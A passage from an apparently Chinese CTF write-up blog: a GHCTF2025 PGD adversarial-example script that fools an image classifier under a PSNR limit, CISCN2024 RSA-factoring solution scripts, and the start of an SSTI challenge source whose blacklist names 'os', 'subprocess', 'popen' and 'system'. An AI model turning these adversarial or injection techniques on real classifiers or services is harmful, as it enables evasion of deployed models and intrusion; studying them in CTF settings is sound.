<span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model = MortisNet()</span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&quot;mortis.pth&quot;</span>, map_location=torch.device(<span class="string">&quot;cpu&quot;</span>)))</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line">transform = transforms.Compose(</span><br><span class="line">    [</span><br><span class="line">        transforms.Resize((<span class="number">512</span>, <span class="number">512</span>)),</span><br><span class="line">        transforms.ToTensor(),</span><br><span class="line">        transforms.Normalize(mean=[<span class="number">0.485</span>, <span class="number">0.456</span>, <span class="number">0.406</span>], std=[<span class="number">0.229</span>, <span class="number">0.224</span>, <span class="number">0.225</span>]),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_psnr</span>(<span class="params">image1_path, image2_path</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">filename</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&quot;&quot;</span>], filename)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(filepath).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    input_tensor = transform(image).unsqueeze(<span class="number">0</span>)</span><br><span class="line">    output = model(input_tensor).item()</span><br><span class="line">    original_image_path = <span class="string">&quot;&quot;</span></span><br><span class="line">    psnr_value = calculate_psnr(original_image_path, filepath)</span><br><span class="line">    os.remove(filepath)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;模型输出值: <span class="subst">&#123;output&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;PSNR: <span class="subst">&#123;psnr_value&#125;</span>&quot;</span>)</span><br><span class="line">    psnr_threshold = <span class="number">40.0</span></span><br><span class="line">    <span class="keyword">if</span> psnr_value &lt; psnr_threshold:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;其他粉丝认为这张图是Anon，你辜负了Mutsumi小姐的信任！&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> output &gt; <span class="number">0.9</span>:</span><br><span class="line">        flag = get_flag()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;其他粉丝认为这张图是Soyo，Mortis小姐有极大把握认为这张图是Anon，恭喜你，揭穿了Morits小姐的真面目！她是<span class="subst">&#123;flag&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> output &gt; <span class="number">0.5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;其他粉丝认为这张图是Soyo，Mortis小姐没太大把握认为这张图是Anon，请你提供更有力的证据！&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;大家都认为你提供的图是Soyo，你辜负了Mutsumi小姐的信任！&quot;</span></span><br></pre></td></tr></table></figure><p>用了PGD攻击</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 MortisNet 模型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MortisNet</span>(torch.nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(MortisNet, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.conv1 = torch.nn.Conv2d(<span class="number">3</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.conv2 = torch.nn.Conv2d(<span class="number">16</span>, <span class="number">32</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.conv3 = torch.nn.Conv2d(<span class="number">32</span>, <span class="number">64</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.dropout1 = torch.nn.Dropout(<span class="number">0.32123432</span>)</span><br><span class="line">        <span class="variable language_">self</span>.fc1 = torch.nn.Linear(<span class="number">64</span> * <span class="number">64</span> * <span class="number">64</span>, <span class="number">512</span>)</span><br><span class="line">        <span class="variable language_">self</span>.fc2 = torch.nn.Linear(<span class="number">512</span>, <span class="number">64</span>)</span><br><span class="line">        <span class="variable language_">self</span>.fc3 = torch.nn.Linear(<span class="number">64</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.conv1(x))</span><br><span class="line">        x = F.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.conv2(x))</span><br><span class="line">        x = F.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.conv3(x))</span><br><span class="line">        x = F.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = torch.flatten(x, <span class="number">1</span>)</span><br><span class="line">        x = <span class="variable language_">self</span>.dropout1(x)</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.fc1(x))</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.fc2(x))</span><br><span class="line">        x = torch.sigmoid(<span class="variable language_">self</span>.fc3(x))</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择设备</span></span><br><span class="line">device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载模型及权重</span></span><br><span class="line">model = MortisNet().to(device)</span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&quot;mortis.pth&quot;</span>, map_location=device))</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义预处理与逆标准化函数</span></span><br><span class="line">transform = transforms.Compose(</span><br><span class="line">    [</span><br><span class="line">        transforms.Resize((<span class="number">512</span>, <span class="number">512</span>)),</span><br><span class="line">        transforms.ToTensor(),</span><br><span class="line">        transforms.Normalize(mean=[<span class="number">0.485</span>, <span class="number">0.456</span>, <span class="number">0.406</span>], std=[<span class="number">0.229</span>, <span class="number">0.224</span>, <span class="number">0.225</span>]),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_transform</span>(<span class="params">tensor</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将归一化后的张量转换回原图（[0,255]，uint8）&quot;&quot;&quot;</span></span><br><span class="line">    tensor = tensor.cpu()</span><br><span class="line">    mean = torch.tensor([<span class="number">0.485</span>, <span class="number">0.456</span>, <span class="number">0.406</span>]).view(<span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    std = torch.tensor([<span class="number">0.229</span>, <span class="number">0.224</span>, <span class="number">0.225</span>]).view(<span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    tensor = tensor * std + mean</span><br><span class="line">    tensor = (tensor * <span class="number">255</span>).clamp(<span class="number">0</span>, <span class="number">255</span>).byte().permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>).numpy()</span><br><span class="line">    <span class="keyword">return</span> tensor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_psnr</span>(<span class="params">img1, img2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算两个图像（numpy 数组，范围 [0,255]）的 PSNR 值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mse = np.mean((img1.astype(np.float32) - img2.astype(np.float32)) ** <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> mse == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">float</span>(<span class="string">&quot;inf&quot;</span>)</span><br><span class="line">    PIXEL_MAX = <span class="number">255.0</span></span><br><span class="line">    psnr = <span class="number">20</span> * np.log10(PIXEL_MAX / np.sqrt(mse))</span><br><span class="line">    <span class="keyword">return</span> psnr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pgd_attack_with_psnr_and_output</span>(<span class="params"></span></span><br><span class="line"><span class="params">    image, epsilon, alpha, num_iter, psnr_threshold=<span class="number">40.0</span>, output_threshold=<span class="number">0.9</span></span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用 PGD 攻击生成对抗样本，同时监控反归一化后图像的 PSNR 与模型输出值。</span></span><br><span class="line"><span class="string">    仅当 PSNR ≥ psnr_threshold 且 output &gt; output_threshold 时，才记录为有效对抗样本。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">      image: 归一化后的输入图片，shape [1, C, H, W]</span></span><br><span class="line"><span class="string">      epsilon: 最大允许扰动（归一化空间）</span></span><br><span class="line"><span class="string">      alpha: 每步扰动步长</span></span><br><span class="line"><span class="string">      num_iter: 迭代次数</span></span><br><span class="line"><span class="string">      psnr_threshold: PSNR 下限（例如40）</span></span><br><span class="line"><span class="string">      output_threshold: 输出阈值（例如0.9）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 保存原始图像（归一化后）及其反归一化版本（用于 PSNR 计算）</span></span><br><span class="line">    orig_image = image.clone().detach()</span><br><span class="line">    orig_de_norm = inv_transform(orig_image.squeeze(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据 Normalize 参数计算归一化空间中每个通道的合法范围</span></span><br><span class="line">    mean_tensor = torch.tensor([<span class="number">0.485</span>, <span class="number">0.456</span>, <span class="number">0.406</span>], device=device).view(<span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    std_tensor = torch.tensor([<span class="number">0.229</span>, <span class="number">0.224</span>, <span class="number">0.225</span>], device=device).view(<span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    lower_bound = (<span class="number">0</span> - mean_tensor) / std_tensor</span><br><span class="line">    upper_bound = (<span class="number">1</span> - mean_tensor) / std_tensor</span><br><span class="line"></span><br><span class="line">    adv_image = image.clone().detach().to(device)</span><br><span class="line">    adv_image.requires_grad = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    best_adv = <span class="literal">None</span></span><br><span class="line">    best_output = -<span class="built_in">float</span>(<span class="string">&quot;inf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用一个目标标签帮助计算梯度（这里目标是使模型输出尽可能接近1）</span></span><br><span class="line">    target = torch.tensor([[<span class="number">1.0</span>]], device=device)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_iter):</span><br><span class="line">        output = model(adv_image)</span><br><span class="line">        loss = -F.binary_cross_entropy(output, target)  <span class="comment"># 最大化输出</span></span><br><span class="line">        model.zero_grad()</span><br><span class="line">        loss.backward()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># PGD 更新（在归一化空间）</span></span><br><span class="line">        adv_image = adv_image + alpha * adv_image.grad.sign()</span><br><span class="line">        <span class="comment"># 限制扰动在 epsilon 范围内，同时保证每个通道在合法范围内</span></span><br><span class="line">        perturbation = torch.clamp(adv_image - image, <span class="built_in">min</span>=-epsilon, <span class="built_in">max</span>=epsilon)</span><br><span class="line">        adv_image = torch.clamp(</span><br><span class="line">            image + perturbation, <span class="built_in">min</span>=lower_bound, <span class="built_in">max</span>=upper_bound</span><br><span class="line">        ).detach()</span><br><span class="line">        adv_image.requires_grad = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算反归一化后图像的 PSNR 与当前模型输出</span></span><br><span class="line">        current_de_norm = inv_transform(adv_image.squeeze(<span class="number">0</span>))</span><br><span class="line">        psnr_val = calculate_psnr(orig_de_norm, current_de_norm)</span><br><span class="line">        current_output = model(adv_image).item()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Iteration <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: PSNR = <span class="subst">&#123;psnr_val:<span class="number">.2</span>f&#125;</span>, Output = <span class="subst">&#123;current_output:<span class="number">.4</span>f&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果当前样本同时满足 PSNR 与输出阈值，则记录为最佳样本（以 output 为准）</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            psnr_val &gt;= psnr_threshold</span><br><span class="line">            <span class="keyword">and</span> current_output &gt; output_threshold</span><br><span class="line">            <span class="keyword">and</span> current_output &gt; best_output</span><br><span class="line">        ):</span><br><span class="line">            best_output = current_output</span><br><span class="line">            best_adv = adv_image.clone().detach()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> best_adv <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">f&quot;最终找到的对抗样本：PSNR ≥ <span class="subst">&#123;psnr_threshold&#125;</span> 且 Output = <span class="subst">&#123;best_output:<span class="number">.4</span>f&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> best_adv</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到满足 PSNR 与输出阈值要求的对抗样本。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取原始图片</span></span><br><span class="line">image_path = <span class="string">&quot;soyo.png&quot;</span></span><br><span class="line">image = Image.<span class="built_in">open</span>(image_path).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">input_tensor = transform(image).unsqueeze(<span class="number">0</span>).to(device)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 PGD 攻击参数（根据实验结果调节）</span></span><br><span class="line">epsilon = <span class="number">0.05</span>  <span class="comment"># 最大扰动（归一化空间）</span></span><br><span class="line">alpha = <span class="number">0.002</span>  <span class="comment"># 每步扰动步长</span></span><br><span class="line">num_iter = <span class="number">100</span>  <span class="comment"># 迭代次数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行 PGD 攻击，同时监控 PSNR 与 output</span></span><br><span class="line">adv_image = pgd_attack_with_psnr_and_output(</span><br><span class="line">    input_tensor, epsilon, alpha, num_iter, psnr_threshold=<span class="number">40.0</span>, output_threshold=<span class="number">0.9</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> adv_image <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    adv_np = inv_transform(adv_image.squeeze(<span class="number">0</span>))</span><br><span class="line">    adv_pil = Image.fromarray(adv_np)</span><br><span class="line">    adv_pil.save(<span class="string">&quot;adv_soyo_pgd_monitor.png&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;对抗样本生成完成，已保存为 adv_soyo_pgd_monitor.png。&quot;</span>)</span><br><span class="line">    final_output = model(adv_image).item()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;最终模型输出值:&quot;</span>, final_output)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;攻击未成功，未生成满足 PSNR 与输出要求的对抗样本。&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/WP/GHCTF2025/soyo.png" alt="adv_soyo_pgd_monitor"><br>soyo小姐么么么</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024 x 长城杯 比赛题解</title>
      <link href="/posts/4fc8968e.html"/>
      <url>/posts/4fc8968e.html</url>
      
        <content type="html"><![CDATA[<p>今年 Crypto 和 Web 都出了一题，比去年爆零有进步吧。</p><h1 id="Crypto">Crypto</h1><h2 id="rasnd">rasnd</h2><p>apbq+Crypto Lost_N 两道原题拼起来的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Challenge1</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">hints = [</span><br><span class="line">    <span class="number">2557457392940293500328359806873861875519711481607248554411143012708460425506405789861902031579370061977302000223121866368860022598772849341765291528563673049510720538970173102917163952881804952885006117660936455147884466194798547196954808660958447621515897160217807304714379022277335659774178828521743187603819725393042228215840466110421890974</span></span><br><span class="line">    + <span class="number">0x114</span>,</span><br><span class="line">    <span class="number">116295189092619963082902515366717554600549607012427171423085625874290045323933400485296666515430155868196222996791749346284352905864283845948708574810913619298848897491790626621390599735516170691148595355670350984178660367914739924363764513926090718641605753288702666184926577428156828631556507126922052875637495536206815385499444800465432852627404959899113672056659625780674323760035826622873691200487204379128102684960705926490338301444566387462457750081546919</span></span><br><span class="line">    + <span class="number">0x514</span>,</span><br><span class="line">]</span><br><span class="line">n = <span class="number">20806169591531852535748465724228648360578231312887226007313004321781244544591722736912461242351409048602920851558150388726657424005676834728977344468751844526125821029164446885764293791657556136110856902679276161205982713931546310002086537632479547320731001845444387665995580877305481273832226754581987095693788901842328627715428608352767249841930285031357514559169082374339482225473027760245720853784538107370565108979115083390982931240869875045901257621854864904889398765582177650568113189257542481290798798524973730181435458613460739132020093706531929423703793591341633478130997904916596385519593671702268702134087</span></span><br><span class="line">c = <span class="number">536010476606635653312788231923076931516462049139210471564909569926405559656638584793612712974721373330580097241624607902861852803583583759683666747875998365735184555964371456855603421787147579992045110220401874570382192138429435829202111482921785987286121754193943724097709711208055715614082672182211905307787395657956826340138960818056336726833036377862997120529421725722181193122397978189573254114044284740849367707617697793561043893746701612789751579517731707978708880198450398476854383433318794224254767398690676674110968900647218058795428209939053198996801584171887829356729227782668483836785995104071375473924</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a1, a2 <span class="keyword">in</span> tqdm(<span class="built_in">list</span>(itertools.product(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">13</span>), repeat=<span class="number">2</span>))):</span><br><span class="line"></span><br><span class="line">    kp = gmpy2.gcd(a1 * hints[<span class="number">0</span>] - a2 * hints[<span class="number">1</span>], n)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt; kp &lt; n:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find!&quot;</span>, kp, a1, a2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> kp % i == <span class="number">0</span>:</span><br><span class="line">        kp //= i</span><br><span class="line"></span><br><span class="line">p = kp</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag1 = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="comment"># Challenge2</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">23262732293229358083313763688306829836026670165087916086734561278396678241656458879545705186386284765797310589032803382841089305568228218217057507039263725250850342614633405534978808661467954778754379627585945536520928291619157856751168742864329379308816486254463786631277756799513534040865320357262030289788808490091504548809535320786222530782821959793700739184806991653308394782496608798380161960610159584907715384807909956187291164062938469312837265779657671191858515277752125826457413348844289649434936315736918853367893641335376476456279899321360423503025949635226339892436658767405548381713247310078003468242087</span></span><br><span class="line">c = <span class="number">4554147243203351412015416542723152157451446348473858599235336912806129388411845156169568228915682438875407840298551630375082918363157925212724376617282161999033871732791337125028044639486045779799567856238632278457670563486477304329354135108110255019457724889864855423777350694858938327475420669238460694686802205335443757093204076245363697160620221919252287389118330667371353238798143184745221804992220835755648831999827803338959219319297206305500882971292800010027082836350543680491062048276792723896580393712631162079863135915524226438979820043808097059331411472786135304531385863672347267254031863634786717096518</span></span><br><span class="line">s = <span class="number">292600782611894602100843370703499439990421550481170386599544938001831324046610358243795343135278824047366453021333025829867150543221759315172622082462644013075786057427322676095295000499594613657120910064112175384534918697853968943745652152045720821909817027427167284881559799883981197088905517932666403864547076024853674620321957678979670416395826054959008683030881806347418552961917423765948727075011053296514981084140118634409054379971680502361388294185032175816323686808183929151995563777112405386898759047885828705769312865992008914758408654963885468459423737972654094097229055829797885363200129459707182512850</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m1 = gmpy2.invert(s, n)</span><br><span class="line">p, q = symbols(<span class="string">&quot;p q&quot;</span>)</span><br><span class="line">eq = [p * q - n, <span class="number">514</span> * p - <span class="number">114</span> * q - m1]</span><br><span class="line">result = nonlinsolve(eq, [p, q])</span><br><span class="line">result = <span class="built_in">list</span>(result)</span><br><span class="line">p, q = <span class="built_in">int</span>(result[<span class="number">1</span>][<span class="number">0</span>]), <span class="built_in">int</span>(result[<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag2 = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br><span class="line"></span><br><span class="line">flag = flag1 + flag2</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="Web">Web</h1><h2 id="Safe-Proxy">Safe_Proxy</h2><p>题目给了源码</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;pre&gt;&quot;</span> + html.escape(f.read()) + <span class="string">&quot;&lt;/pre&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    template_code = request.form.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&quot;__&quot;</span>,</span><br><span class="line">        <span class="string">&quot;import&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sys&quot;</span>,</span><br><span class="line">        <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">        <span class="string">&quot;popen&quot;</span>,</span><br><span class="line">        <span class="string">&quot;system&quot;</span>,</span><br><span class="line">        <span class="string">&quot;\r&quot;</span>,</span><br><span class="line">        <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span> + black</span><br><span class="line">    result = render_template_string(template_code)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span> <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HTTPProxyHandler</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_host, target_port</span>):</span><br><span class="line">        <span class="variable language_">self</span>.target_host = target_host</span><br><span class="line">        <span class="variable language_">self</span>.target_port = target_port</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_request</span>(<span class="params">self, client_socket</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                chunk = client_socket.recv(<span class="number">4096</span>)</span><br><span class="line">                request_data += chunk</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> request_data:</span><br><span class="line">                client_socket.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> proxy_socket:</span><br><span class="line">                proxy_socket.connect((<span class="variable language_">self</span>.target_host, <span class="variable language_">self</span>.target_port))</span><br><span class="line">                proxy_socket.sendall(request_data)</span><br><span class="line"></span><br><span class="line">                response_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    chunk = proxy_socket.recv(<span class="number">4096</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    response_data += chunk</span><br><span class="line"></span><br><span class="line">            header_end = response_data.rfind(<span class="string">b&quot;\r\n\r\n&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> header_end != -<span class="number">1</span>:</span><br><span class="line">                body = response_data[header_end + <span class="number">4</span> :]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                body = response_data</span><br><span class="line"></span><br><span class="line">            response_body = body</span><br><span class="line">            response = (</span><br><span class="line">                <span class="string">b&quot;HTTP/1.1 200 OK\r\n&quot;</span></span><br><span class="line">                <span class="string">b&quot;Content-Length: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(response_body)).encode() + <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">                <span class="string">b&quot;Content-Type: text/html; charset=utf-8\r\n&quot;</span></span><br><span class="line">                <span class="string">b&quot;\r\n&quot;</span> + response_body</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            client_socket.sendall(response)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Proxy Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            client_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_proxy_server</span>(<span class="params">host, port, target_host, target_port</span>):</span><br><span class="line">    proxy_handler = HTTPProxyHandler(target_host, target_port)</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    server_socket.listen(<span class="number">100</span>)</span><br><span class="line">    <span 